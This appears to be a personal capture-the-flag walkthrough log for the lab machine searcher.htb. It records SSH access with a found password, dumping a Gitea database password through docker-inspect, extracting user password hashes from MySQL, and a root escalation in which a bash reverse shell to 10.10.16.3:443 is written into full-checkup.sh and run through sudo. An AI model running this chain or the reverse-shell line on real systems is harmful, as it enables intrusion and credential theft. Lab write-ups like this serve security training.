+3000/tcp  open   ppp?
+3306/tcp  open   mysql   MySQL 8.0.31
+5000/tcp  open   upnp?
+39893/tcp open   unknown
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ssh from local host
+//svc:jh1usoih2bkjaspwe92 
+//SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-13 00:27:25 CDT -- 
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" svc@10.129.42.176
+
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+
+//SUCCESS
+
+2023-04-13 00:30:31 CDT -- 
+sudo -ll
+[sudo] password for svc: jh1usoih2bkjaspwe92
+
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+
+Sudoers entry:
+    RunAsUsers: root
+    Commands:
+        /usr/bin/python3 /opt/scripts/system-checkup.py *
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// /opt/scripts/system-checkup.py 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+ls -lah /opt/scripts/system-checkup.py 
+-rwx--x--x 1 root root 1.9K Dec 24 21:23 /opt/scripts/system-checkup.py
+
+2023-04-13 00:32:23 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
+< /usr/bin/python3 /opt/scripts/system-checkup.py -h
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+
+2023-04-13 00:32:32 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps 
+
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+
+2023-04-13 00:32:42 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect -h
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+
+2023-04-13 00:32:50 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+//Something went wrong
+
+
+https://docs.docker.com/config/formatting/
+//To find out what data can be printed, show all content as json:
+
+2023-04-13 00:37:24 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea > gitea.config
+
+2023-04-13 00:45:01 CDT -- 
+scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" svc@10.129.42.176:/home/svc/gitea.config .
+
+2023-04-13 00:47:22 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql:8 > mysql8.config
+
+2023-04-13 00:47:50 CDT -- 
+scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" svc@10.129.42.176:/home/svc/mysql8.config .
+
+//gitea.config
+"GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
+
+//CREDS:
+//gitea:yuiu1hoiu4i5ho1uh
+
+//mysql8.config
+"MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["/bin/sh","-c","#(nop) ","CMD [\"mysqld\"]"],"
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- mysql client --
+//gitea:yuiu1hoiu4i5ho1uh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-13 00:58:50 CDT -- 
+# interactive login
+mysql --host=127.0.0.1 --port=3306 --user=gitea --password=yuiu1hoiu4i5ho1uh
+
+//SUCCESS
+
+mysql> show grants;
++--------------------------------------------------+
+| Grants for gitea@%                               |
++--------------------------------------------------+
+| GRANT USAGE ON *.* TO `gitea`@`%`                |
+| GRANT ALL PRIVILEGES ON `gitea`.* TO `gitea`@`%` |
++--------------------------------------------------+
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| gitea              |
+| information_schema |
+| performance_schema |
++--------------------+
+
+mysql> use gitea;
+mysql> show tables;
++---------------------------+
+| Tables_in_gitea           |
++---------------------------+
+| access                    |
+| access_token              |
+| action                    |
+| app_state                 |
+| attachment                |
+| badge                     |
+| collaboration             |
+| comment                   |
+| commit_status             |
+| commit_status_index       |
+| deleted_branch            |
+| deploy_key                |
+| email_address             |
+| email_hash                |
+| external_login_user       |
+| follow                    |
+| foreign_reference         |
+| gpg_key                   |
+| gpg_key_import            |
+| hook_task                 |
+| issue                     |
+| issue_assignees           |
+| issue_content_history     |
+| issue_dependency          |
+| issue_index               |
+| issue_label               |
+| issue_user                |
+| issue_watch               |
+| label                     |
+| language_stat             |
+| lfs_lock                  |
+| lfs_meta_object           |
+| login_source              |
+| milestone                 |
+| mirror                    |
+| notice                    |
+| notification              |
+| oauth2_application        |
+| oauth2_authorization_code |
+| oauth2_grant              |
+| org_user                  |
+| package                   |
+| package_blob              |
+| package_blob_upload       |
+| package_file              |
+| package_property          |
+| package_version           |
+| project                   |
+| project_board             |
+| project_issue             |
+| protected_branch          |
+| protected_tag             |
+| public_key                |
+| pull_auto_merge           |
+| pull_request              |
+| push_mirror               |
+| reaction                  |
+| release                   |
+| renamed_branch            |
+| repo_archiver             |
+| repo_indexer_status       |
+| repo_redirect             |
+| repo_topic                |
+| repo_transfer             |
+| repo_unit                 |
+| repository                |
+| review                    |
+| review_state              |
+| session                   |
+| star                      |
+| stopwatch                 |
+| system_setting            |
+| task                      |
+| team                      |
+| team_invite               |
+| team_repo                 |
+| team_unit                 |
+| team_user                 |
+| topic                     |
+| tracked_time              |
+| two_factor                |
+| upload                    |
+| user                      |
+| user_badge                |
+| user_open_id              |
+| user_redirect             |
+| user_setting              |
+| version                   |
+| watch                     |
+| webauthn_credential       |
+| webhook                   |
++---------------------------+
+
+mysql> show columns from user;
++--------------------------------+---------------+------+-----+---------+----------------+
+| Field                          | Type          | Null | Key | Default | Extra          |
++--------------------------------+---------------+------+-----+---------+----------------+
+| id                             | bigint        | NO   | PRI | NULL    | auto_increment |
+| lower_name                     | varchar(255)  | NO   | UNI | NULL    |                |
+| name                           | varchar(255)  | NO   | UNI | NULL    |                |
+| full_name                      | varchar(255)  | YES  |     | NULL    |                |
+| email                          | varchar(255)  | NO   |     | NULL    |                |
+| keep_email_private             | tinyint(1)    | YES  |     | NULL    |                |
+| email_notifications_preference | varchar(20)   | NO   |     | enabled |                |
+| passwd                         | varchar(255)  | NO   |     | NULL    |                |
+| passwd_hash_algo               | varchar(255)  | NO   |     | argon2  |                |
+| must_change_password           | tinyint(1)    | NO   |     | 0       |                |
+| login_type                     | int           | YES  |     | NULL    |                |
+| login_source                   | bigint        | NO   |     | 0       |                |
+| login_name                     | varchar(255)  | YES  |     | NULL    |                |
+| type                           | int           | YES  |     | NULL    |                |
+| location                       | varchar(255)  | YES  |     | NULL    |                |
+| website                        | varchar(255)  | YES  |     | NULL    |                |
+| rands                          | varchar(32)   | YES  |     | NULL    |                |
+| salt                           | varchar(32)   | YES  |     | NULL    |                |
+| language                       | varchar(5)    | YES  |     | NULL    |                |
+| description                    | varchar(255)  | YES  |     | NULL    |                |
+| created_unix                   | bigint        | YES  | MUL | NULL    |                |
+| updated_unix                   | bigint        | YES  | MUL | NULL    |                |
+| last_login_unix                | bigint        | YES  | MUL | NULL    |                |
+| last_repo_visibility           | tinyint(1)    | YES  |     | NULL    |                |
+| max_repo_creation              | int           | NO   |     | -1      |                |
+| is_active                      | tinyint(1)    | YES  | MUL | NULL    |                |
+| is_admin                       | tinyint(1)    | YES  |     | NULL    |                |
+| is_restricted                  | tinyint(1)    | NO   |     | 0       |                |
+| allow_git_hook                 | tinyint(1)    | YES  |     | NULL    |                |
+| allow_import_local             | tinyint(1)    | YES  |     | NULL    |                |
+| allow_create_organization      | tinyint(1)    | YES  |     | 1       |                |
+| prohibit_login                 | tinyint(1)    | NO   |     | 0       |                |
+| avatar                         | varchar(2048) | NO   |     | NULL    |                |
+| avatar_email                   | varchar(255)  | NO   |     | NULL    |                |
+| use_custom_avatar              | tinyint(1)    | YES  |     | NULL    |                |
+| num_followers                  | int           | YES  |     | NULL    |                |
+| num_following                  | int           | NO   |     | 0       |                |
+| num_stars                      | int           | YES  |     | NULL    |                |
+| num_repos                      | int           | YES  |     | NULL    |                |
+| num_teams                      | int           | YES  |     | NULL    |                |
+| num_members                    | int           | YES  |     | NULL    |                |
+| visibility                     | int           | NO   |     | 0       |                |
+| repo_admin_change_team_access  | tinyint(1)    | NO   |     | 0       |                |
+| diff_view_style                | varchar(255)  | NO   |     |         |                |
+| theme                          | varchar(255)  | NO   |     |         |                |
+| keep_activity_private          | tinyint(1)    | NO   |     | 0       |                |
++--------------------------------+---------------+------+-----+---------+----------------+
+
+mysql> SELECT id,name,salt,passwd_hash_algo,passwd,is_admin FROM user;
++----+---------------+----------------------------------+------------------+------------------------------------------------------------------------------------------------------+----------+
+| id | name          | salt                             | passwd_hash_algo | passwd                                                                                               | is_admin |
++----+---------------+----------------------------------+------------------+------------------------------------------------------------------------------------------------------+----------+
+|  1 | administrator | a378d3f64143b284f104c926b8b49dfb | pbkdf2           | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |        1 |
+|  2 | cody          | d1db0a75a18e50de754be2aafcad5533 | pbkdf2           | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |        0 |
++----+---------------+----------------------------------+------------------+------------------------------------------------------------------------------------------------------+----------+
+
+// administrator:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+// cody:b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// WebBrowse through chisel
+//administrator:yuiu1hoiu4i5ho1uh
+//SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+══╣ PHP exec extensions
+ServerName searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+
+//FoxyProxy Settings
+127.0.0.1 SOCKS5 9050
+
+//Browse
+http://127.0.0.1:3000
+
+//Sign-IN
+//administrator:yuiu1hoiu4i5ho1uh
+
+//SUCCESS
+
+//A git repo that includes cody and administator scripts
+// cody / Searcher_site
+// administrator / scripts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Binary Analysis
+// /opt/scripts/system-checkup.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
+[sudo] password for svc: 
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+
+// system-checkup.py
+// A script name full-checkup.sh can be run in the current directory as root
+// A RevShell can be created to get access with root privs
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+cd /home/svc
+
+// full-checkup.sh
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+#!/bin/bash
+
+/bin/bash -i >& /dev/tcp/10.10.16.3/443 0>&1
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+chmod +x full-checkup.sh
+
+sudo rlwrap -cAr nc -lvnp 443
+
+
+2023-04-13 01:55:49 CDT -- 
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+//SUCCESS
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/root.txt
+//11aa94ced776a2722042c1322487d33c
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#PWNED
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠖⠛⠛⠛⠳⠶⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠉⢿⡀⠀⠀⠀⠀⠀⠀⣠⡶⠶⣄⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⡿⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⠏⠀⠀⢸⡆⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢀⣾⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⣸⠁⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠈⢿⡀⠒⣰⡏⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢰⡟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⠟⠋⣠⡴⠶⠟⠒⢶⣄⠀⠈⠉⠉⠉⠀⠀⢠⡿⡀⠀⠀⠀⢀⣶⠶⣦⠀⠀
+⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢠⡟⢻⡏⢤⣟⡄⠀
+⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠘⠿⠚⠻⠾⠋⠁⠀
+⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀
+⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣿⠹⣗⡆⣸⡇
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠻⠖⠷⣧⠟⠀
+⡏⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⢸⡆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡦⠄⢹⡆⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠈⣿⠀⠀⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡓⠚⠃⠀⠀⠀⠀⠀⠀⠀
+⢹⡄⠀⠀⢻⣆⣂⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⡇⠀⠀⠀⠙⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⣾⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡀⠀⠀⢀⣼⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢧⣀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⣠⣾⣥⣤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠷⢦⣤⣀⣀⣠⡴⠟⠉⠛⠶⠦⠤⠶⠾⠋⠉⠛⠓⠶⠚⠋⠉⠀
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-04-13 02:14:03 CDT -- COMPLETE
+
